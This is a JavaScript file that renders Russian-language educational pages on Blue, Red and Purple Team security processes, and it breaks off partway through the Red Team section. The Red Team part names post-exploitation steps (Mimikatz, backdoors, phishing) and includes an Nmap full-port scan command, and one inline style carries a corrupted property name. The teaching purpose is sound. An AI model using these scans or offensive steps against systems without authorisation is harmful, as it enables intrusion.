// This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0.
// If a copy of the MPL was not distributed with this file, You can obtain one at https://mozilla.org/MPL/2.0.

function loadTeamsThreatIntelContent(contentArea) {
  const initialContent = `
    <div class="teams-threat-container">
      <h1>Команды ИБ</h1>
      <div class="teams-threat-description">
        <p>В области информационной безопасности ключевую роль играют специализированные команды и процессы, направленные на защиту, тестирование и анализ киберугроз. Этот раздел охватывает подходы команд <strong>Blue Team</strong>, <strong>Red Team</strong>, <strong>Purple Team</strong>, процессы <strong>Threat Hunting</strong>, <strong>Threat Intelligence</strong> и организацию <strong>SOC</strong>.</p>
      </div>
      <div class="osi-buttons">
        <button class="osi-btn" id="blue-team-btn">Blue Team</button>
        <button class="osi-btn" id="red-team-btn">Red Team</button>
        <button class="osi-btn" id="purple-team-btn">Purple Team</button>
        <button class="osi-btn" id="threat-hunting-btn">Threat Hunting</button>
        <button class="osi-btn" id="threat-intel-btn">Threat Intelligence</button>
        <button class="osi-btn" id="soc-btn">SOC</button>
      </div>
      <div class="teams-schemes">
        <h2>Схемы процессов команд</h2>
        <p>Ниже представлены детализированные схемы процессов для каждой команды, показывающие этапы их работы и взаимодействия:</p>
        <div class="scheme-frame" style="border: 2px solid #000; border-radius: 8px; background-color: #05060a; padding: 20px; display: flex; justify-content: flex-start; align-items: stretch; gap: 40px; position: relative; overflow-x: auto; white-space: nowrap;">
          <div class="blue-team-diagram" style="flex: 0 0 auto; min-width: 250px; padding: 20px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Blue Team</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
              <div style="background-color: #1976d2; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Настройка защиты
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Установка IDS/IPS, WAF, правил фильтрации.</p>
              </div>
              <div style="background-color: #2196f3; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Мониторинг
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Сбор логов в SIEM, анализ трафика.</p>
              </div>
              <div style="background-color: #42a5f5; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Обнаружение
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Выявление аномалий, сигнатур атак.</p>
              </div>
              <div style="border: 2px solid #64b5f6; padding: 10px; border-radius: 5px; width: 250px;">
                <div style="background-color: #64b5f6; padding: 5px; border-radius: 5px; white-space: normal; word-wrap: break-word;">
                  Реагирование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Блокировка IP, изоляция узлов.</p>
                </div>
                <div style="background-color: #90caf9; padding: 5px; border-radius: 5px; margin-top: 5px; white-space: normal; word-wrap: break-word;">
                  Анализ инцидента
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Определение источника, сбор данных.</p>
                </div>
              </div>
              <div style="background-color: #bbdefb; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word; color: #000;">
                Восстановление
                <p style="font-size: 12px; margin: 5px 0 0; color: #000;">Установка патчей, бэкапы.</p>
              </div>
              <div style="background-color: #2a2f3b; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: normal; word-wrap: break-word;">
                <span style="font-size: 16px;">Результат</span>
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Система защищена, уроки извлечены.</p>
              </div>
            </div>
          </div>
          <div class="red-team-diagram" style="flex: 0 0 auto; min-width: 250px; padding: 20px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Red Team</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
              <div style="background-color: #d32f2f; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Планирование
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Определение целей, согласование RoE.</p>
              </div>
              <div style="background-color: #f44336; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Разведка
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">OSINT (Shodan), сканирование (Nmap).</p>
              </div>
              <div style="background-color: #ef5350; padding: 10px; border-radius: 5px; width: 200px; white覺得: normal; word-wrap: break-word;">
                Поиск уязвимостей
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Burp Suite, Nessus, ручной анализ.</p>
              </div>
              <div style="border: 2px solid #e57373; padding: 10px; border-radius: 5px; width: 250px;">
                <div style="background-color: #e57373; padding: 5px; border-radius: 5px; white-space: normal; word-wrap: break-word;">
                  Эксплуатация
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Запуск эксплойтов, SQLi.</p>
                </div>
                <div style="background-color: #ef9a9a; padding: 5px; border-radius: 5px; margin-top: 5px; white-space: normal; word-wrap: break-word;">
                  Эскалация привилегий
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Mimikatz, уязвимости ядра.</p>
                </div>
              </div>
              <div style="background-color: #ffcdd2; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word; color: #000;">
                Пост-эксплуатация
                <p style="font-size: 12px; margin: 5px 0 0; color: #000;">Установка бэкдоров, сбор данных.</p>
              </div>
              <div style="background-color: #2a2f3b; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: normal; word-wrap: break-word;">
                <span style="font-size: 16px;">Результат</span>
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Отчёт с уязвимостями.</p>
              </div>
            </div>
          </div>
          <div class="purple-team-diagram" style="flex: 0 0 auto; min-width: 250px; padding: 20px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Purple Team</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
              <div style="background-color: #8e24aa; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Планирование
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Согласование сценариев атак.</p>
              </div>
              <div style="background-color: #ab47bc; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Тестирование Red Team
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Запуск атак (XSS, фишинг).</p>
              </div>
              <div style="background-color: #ba68c8; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Реакция Blue Team
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Обнаружение и блокировка.</p>
              </div>
              <div style="border: 2px solid #ce93d8; padding: 10px; border-radius: 5px; width: 250px;">
                <div style="background-color: #ce93d8; padding: 5px; border-radius: 5px; white-space: normal; word-wrap: break-word;">
                  Анализ результатов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Сравнение действий, поиск пробелов.</p>
                </div>
                <div style="background-color: #e1bee7; padding: 5px; border-radius: 5px; margin-top: 5px; white-space: normal; word-wrap: break-word; color: #000;">
                  Оптимизация
                  <p style="font-size: 12px; margin: 5px 0 0; color: #000;">Обновление правил, обучение.</p>
                </div>
              </div>
              <div style="background-color: #2a2f3b; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: normal; word-wrap: break-word;">
                <span style="font-size: 16px;">Результат</span>
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Улучшенная защита.</p>
              </div>
            </div>
          </div>
          <svg id="team-arrows-svg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;">
            <defs>
              <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="0" refY="3.5" orient="auto">
                <polygon points="0 0, 10 3.5, 0 7" fill="#666" />
              </marker>
            </defs>
            <path id="team-arrow1" stroke="#666" stroke-width="2" fill="none" marker-end="url(#arrowhead)" />
            <path id="team-arrow2" stroke="#666" stroke-width="2" fill="none" marker-end="url(#arrowhead)" />
          </svg>
        </div>
        <p>Схемы показывают, как Blue Team защищает систему, Red Team атакует её, а Purple Team координирует усилия.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = initialContent;

  function drawTeamArrows() {
    const schemeFrame = document.querySelector('.teams-schemes .scheme-frame');
    if (!schemeFrame) return;

    const blueMonitor = document.querySelector('.blue-team-diagram div:nth-child(2)');
    const redAttack = document.querySelector('.red-team-diagram div:nth-child(3)');
    const purpleAnalyze = document.querySelector('.purple-team-diagram div:nth-child(4) div:first-child');

    if (!blueMonitor || !redAttack || !purpleAnalyze) return;

    const frameRect = schemeFrame.getBoundingClientRect();
    const blueRect = blueMonitor.getBoundingClientRect();
    const redRect = redAttack.getBoundingClientRect();
    const purpleRect = purpleAnalyze.getBoundingClientRect();

    const startX1 = blueRect.right - frameRect.left;
    const startY1 = (blueRect.top + blueRect.bottom) / 2 - frameRect.top;
    const endX1 = redRect.left - frameRect.left;
    const endY1 = (redRect.top + redRect.bottom) / 2 - frameRect.top;

    const startX2 = redRect.right - frameRect.left;
    const startY2 = (redRect.top + redRect.bottom) / 2 - frameRect.top;
    const endX2 = purpleRect.left - frameRect.left;
    const endY2 = (purpleRect.top + purpleRect.bottom) / 2 - frameRect.top;

    const arrow1 = document.getElementById('team-arrow1');
    arrow1.setAttribute('d', `M${startX1},${startY1} C${startX1 + (endX1 - startX1) / 2},${startY1} ${startX1 + (endX1 - startX1) / 2},${endY1} ${endX1},${endY1}`);

    const arrow2 = document.getElementById('team-arrow2');
    arrow2.setAttribute('d', `M${startX2},${startY2} C${startX2 + (endX2 - startX2) / 2},${startY2} ${startX2 + (endX2 - startX2) / 2},${endY2} ${endX2},${endY2}`);
  }

  function debounce(func, wait) {
    let timeout;
    return function (...args) {
      clearTimeout(timeout);
      timeout = setTimeout(() => func.apply(this, args), wait);
    };
  }

  const debouncedDrawTeamArrows = debounce(drawTeamArrows, 100);

  setTimeout(drawTeamArrows, 100);

  window.addEventListener('resize', debouncedDrawTeamArrows);
  document.querySelector('.teams-schemes .scheme-frame').addEventListener('scroll', debouncedDrawTeamArrows);

  document.getElementById('blue-team-btn').addEventListener('click', () => loadBlueTeamContent(contentArea));
  document.getElementById('red-team-btn').addEventListener('click', () => loadRedTeamContent(contentArea));
  document.getElementById('purple-team-btn').addEventListener('click', () => loadPurpleTeamContent(contentArea));
  document.getElementById('threat-hunting-btn').addEventListener('click', () => loadThreatHuntingContent(contentArea));
  document.getElementById('threat-intel-btn').addEventListener('click', () => loadThreatIntelContent(contentArea));
  document.getElementById('soc-btn').addEventListener('click', () => loadSocContent(contentArea));
}

function loadBlueTeamContent(contentArea) {
  const blueTeamContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Blue Team (Синяя команда)</h1>
      <div class="lna-example">
        <h2>Теория работы Blue Team</h2>
        <p>Blue Team отвечает за защиту инфраструктуры, работая в тесной связке с SOC, ИТ-отделом и Purple Team. Их деятельность охватывает весь цикл управления безопасностью: от настройки защитных мер до восстановления после инцидентов. Команда использует многоуровневый подход, комбинируя превентивные меры, мониторинг и реагирование.</p>
        <h3>Схема процессов и операций</h3>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Превентивная защита</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Настройка брандмауэров
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">pfSense</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Установка WAF
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Cloudflare</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Настройка IDS/IPS
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Snort</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Превентивная защита</h3>
              <p>Blue Team начинает с настройки брандмауэров (например, pfSense) для фильтрации входящего и исходящего трафика по IP, портам и протоколам, минимизируя поверхность атаки. Устанавливается WAF (Cloudflare), который защищает веб-приложения от распространённых угроз, таких как XSS, SQL-инъекции и CSRF, благодаря фильтрации HTTP-запросов. Также настраивается IDS/IPS (Snort) с ежедневным обновлением сигнатур для автоматического обнаружения и блокировки известных атак, таких как эксплойты или сканирование портов. Дополнительно применяются политики безопасности в Active Directory: минимальные привилегии для пользователей, сложные пароли (мин. 12 символов, смена каждые 90 дней) и двухфакторная аутентификация.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Мониторинг</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ логов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Splunk</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Настройка дашбордов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Аномалии</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Ежедневный аудит
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">ELK Stack</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Мониторинг</h3>
              <p>Для мониторинга Blue Team использует Splunk, собирая логи с серверов, сетевых устройств и приложений в реальном времени. Splunk позволяет анализировать события, такие как попытки входа, изменения файлов или рост трафика, с помощью корреляционных правил (например, алерт на >500 ошибок 401 за минуту). Настраиваются дашборды для выявления аномалий: рост числа запросов с одного IP (>1000/мин), необычные геолокации входов или всплески трафика. Ежедневный аудит проводится через ELK Stack, где анализируются события за последние 24 часа для поиска подозрительных действий, таких как несанкционированные изменения конфигураций или запуск неизвестных процессов.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Обнаружение</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Классификация событий
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Уровни 1–5</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Использование сигнатур
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Snort</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Поведенческий анализ
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Kaspersky</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Обнаружение</h3>
              <p>Blue Team классифицирует события по уровням критичности: уровень 1 (низкий, например, неудачный вход) до уровня 5 (критический, например, эксплойт). Snort использует сигнатуры для обнаружения известных атак: сканирование портов, эксплойты (например, EternalBlue), вредоносные сигнатуры в трафике. Поведенческий анализ через Kaspersky Behavior Detection отслеживает аномалии, такие как запуск подозрительных процессов (например, powershell.exe с необычными аргументами), несанкционированное шифрование файлов (возможный ransomware) или необычные сетевые подключения (например, исходящий трафик на C2-сервер).</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Реагирование</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Изоляция узлов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">VLAN</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Блокировка IP
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Брандмауэр</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Время реакции
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;"><30 минут</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Реагирование</h3>
              <p>При обнаружении инцидента Blue Team изолирует заражённые узлы, переводя их в отдельную VLAN, чтобы предотвратить распространение угрозы (например, боковое перемещение в сети). Подозрительные IP-адреса (например, источник DDoS-атаки) блокируются на брандмауэре, используя правила фильтрации (drop для определённых IP/портов). Среднее время реакции на критические инциденты (уровень 4–5) составляет менее 30 минут: от момента алерта в SIEM до выполнения первых действий (изоляция, блокировка). Также применяются временные меры, такие как отключение учетной записи, если она скомпрометирована, и уведомление SOC для координации.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Восстановление</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Восстановление данных
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Veeam</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Применение патчей
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">WSUS</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Обновление правил
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SIEM</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Восстановление</h3>
              <p>После инцидента Blue Team восстанавливает данные из бэкапов с помощью Veeam: ежедневные копии позволяют вернуть систему к состоянию до атаки (RPO <24 часа). Патчи для устранения уязвимостей (например, CVE в Apache) устанавливаются через WSUS, который централизованно управляет обновлениями Windows-систем, минимизируя риск повторных атак. Правила в SIEM обновляются: добавляются новые корреляционные правила на основе IOC (например, хэши вредоносных файлов), чтобы предотвратить схожие инциденты. Также пересматриваются политики доступа, если атака была связана с компрометацией учетных данных.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Анализ</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #1976d2; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Проведение RCA
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Root Cause Analysis</p>
                </div>
                <div style="background-color: #2196f3; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ логов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Email-логи</p>
                </div>
                <div style="background-color: #42a5f5; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Предотвращение
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Повторных инцидентов</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Анализ</h3>
              <p>После инцидента Blue Team проводит Root Cause Analysis (RCA), чтобы определить первопричину: например, фишинговая атака началась с поддельного email, обошедшего фильтры. Анализируются email-логи в Splunk, чтобы выявить отправителя, заголовки письма и вредоносные ссылки (например, домен phishing123.com). На основе анализа разрабатываются меры предотвращения: обновление фильтров на email-шлюзе (блокировка подозрительных доменов), обучение сотрудников распознаванию фишинга и внедрение sandbox-анализа для проверки вложений. Также создаются новые сигнатуры для SIEM, чтобы обнаруживать схожие атаки в будущем.</p>
            </div>
          </div>
        </div>
        <h3>Взаимодействие с другими командами</h3>
        <ul>
          <li><strong>Red Team:</strong> Получение отчетов о пентестах для устранения уязвимостей. Совместные упражнения через Purple Team.</li>
          <li><strong>Purple Team:</strong> Участие в тестировании сценариев атак (например, DDoS) для улучшения мониторинга.</li>
          <li><strong>Threat Hunting:</strong> Интеграция данных об APT для настройки новых правил SIEM.</li>
          <li><strong>Threat Intelligence:</strong> Использование IOC (хэши, IP) для обновления сигнатур Snort.</li>
          <li><strong>SOC:</strong> Передача событий уровня 1–2 для немедленного реагирования. Получение аналитики от SOC для настройки дашбордов.</li>
        </ul>
        <h3>Ключевые показатели эффективности (KPI)</h3>
        <ul>
          <li>Время обнаружения инцидента: <15 минут.</li>
          <li>Время реагирования: <30 минут для уровня 1–2.</li>
          <li>Процент устранённых уязвимостей: >95% в течение 30 дней.</li>
          <li>Частота обновления сигнатур: ежедневно.</li>
        </ul>
        <h3>Пример работы</h3>
        <p>Blue Team обнаружила всплеск трафика через Splunk (10,000 запросов/мин с IP 192.168.1.100). Анализ показал DDoS-атаку (SYN-flood). Команда заблокировала IP через брандмауэр, изолировала атакуемый сервер, восстановила сервис из бэкапа за 2 часа. RCA выявил уязвимость в конфигурации WAF, которая была исправлена.</p>
        <p><strong>Положения:</strong></p>
        <ul>
          <li>Развертывание SIEM-системы (Splunk) для мониторинга логов и трафика в реальном времени.</li>
          <li>Настройка IDS/IPS (Snort) для обнаружения и блокировки атак (ежедневное обновление сигнатур).</li>
          <li>Установка WAF (Cloudflare) для защиты веб-приложений от XSS, SQLi и других угроз.</li>
          <li>Ежедневный аудит логов через ELK Stack для выявления аномалий.</li>
          <li>Обеспечение антивирусной защиты (Kaspersky) на всех устройствах с еженедельным сканированием.</li>
          <li>Разработка DRP и BCP для восстановления систем после инцидентов (тестирование раз в квартал).</li>
          <li>Обучение персонала по ИБ раз в полгода.</li>
          <li>Реагирование на инциденты в течение 1 часа с момента обнаружения.</li>
        </ul>
        <p><strong>Ответственность:</strong></p>
        <ul>
          <li><strong>Blue Team:</strong> Мониторинг, реагирование, разработка процедур.</li>
          <li><strong>ИТ-отдел:</strong> Техническая поддержка защитных систем.</li>
          <li><strong>Руководство:</strong> Утверждение ЛНА, обеспечение ресурсов.</li>
        </ul>
        <p><strong>Порядок внедрения:</strong></p>
        <ul>
          <li>Ознакомление сотрудников через портал (до 25 марта 2025).</li>
          <li>Развертывание SIEM и IDS/IPS (до 10 апреля 2025).</li>
          <li>Проведение аудита текущей защиты (до 15 апреля 2025).</li>
        </ul>
        <p><strong>Порядок пересмотра:</strong> Ежегодно (до 31 декабря) или при изменении угроз.</p>
        <p><strong>Приложения:</strong> Чек-лист настройки SIEM, шаблон отчета об инциденте, дашборд Splunk.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = blueTeamContent;
  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}

function loadRedTeamContent(contentArea) {
  const redTeamContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Red Team (Красная команда)</h1>
      <div class="lna-example">
        <h2>Теория работы Red Team</h2>
        <p>Red Team имитирует действия злоумышленников, чтобы проверить защищённость инфраструктуры. Команда использует методики, аналогичные реальным кибератакам, включая технические эксплойты, социальную инженерию и физический доступ. Их работа помогает выявить слабые места до того, как ими воспользуются настоящие атакующие.</p>
        <h3>Схема процессов и операций</h3>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Планирование</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Согласование целей
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">С руководством</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Определение RoE
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Правила</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Выбор активов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Серверы, БД</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Планирование</h3>
              <p>Red Team начинает с согласования целей с руководством и Blue Team, определяя ключевые активы (например, серверы с конфиденциальными данными, базы данных CRM). Правила взаимодействия (RoE) устанавливают границы тестирования: допустимые методы (например, запрет на DDoS), временные рамки (тесты с 22:00 до 06:00), и исключения (критические системы). Используются системы управления проектами, такие как Jira, для документирования задач и сроков. Пример: тестирование веб-приложения на уязвимости XSS с уведомлением Blue Team за 48 часов.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Разведка</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  OSINT
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Shodan, WHOIS</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Сканирование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Nmap, Amass</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Социальная инженерия
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Phishing</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Разведка</h3>
              <p>Red Team проводит сбор данных через OSINT, используя Shodan для поиска открытых портов (80, 443) и WHOIS для получения информации о доменах. Активное сканирование выполняется с помощью Nmap (например, <code>nmap -sS -p- 10.0.0.0/24</code>) для выявления устройств и служб, а Amass помогает обнаружить субдомены. Социальная инженерия включает фишинговые кампании через SET (Social-Engineer Toolkit) для сбора учетных данных. Пример: обнаружение субдомена admin.company.com через Amass и открытых портов 3389 (RDP) через Nmap.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Поиск уязвимостей</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ приложений
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Burp Suite</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Сканирование сети
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Nessus</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Ручной анализ
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Code Review</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Поиск уязвимостей</h3>
